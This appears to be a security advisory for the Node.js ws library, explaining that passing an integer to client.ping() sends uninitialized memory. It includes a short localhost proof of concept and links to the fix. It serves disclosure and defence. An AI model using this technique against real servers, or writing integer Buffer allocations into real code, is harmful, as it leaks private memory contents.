## Overview
A client side memory disclosure vulnerability exists in ping functionality of the ws service. When a client sends a ping request and provides an integer value as ping data, it will result in leaking an uninitialized memory buffer.

## Details
Constructing a `Buffer` class with integer `N` creates a `Buffer` of length `N` with non zero-ed out memory.

**Example:**
```
var x = new Buffer(100);
// vs
var x = new Buffer('100');
```

This would allocate 100 bytes of memory in the first example and just 3 bytes with 100 as value in the second example.

```
var ws = require('ws')

var server = new ws.Server({ port: 9000 })
var client = new ws('ws://localhost:9000')

client.on('open', function () {
  console.log('open')
  client.ping(50) // this makes the client allocate an uninitialized buffer of 50 bytes and send it to the server

  client.on('pong', function (data) {
    console.log('got pong')
    console.log(data)
  })
})
```

## References
- https://github.com/websockets/ws/releases/tag/1.0.1
- https://github.com/nodejs/node-v0.x-archive/issues/4525
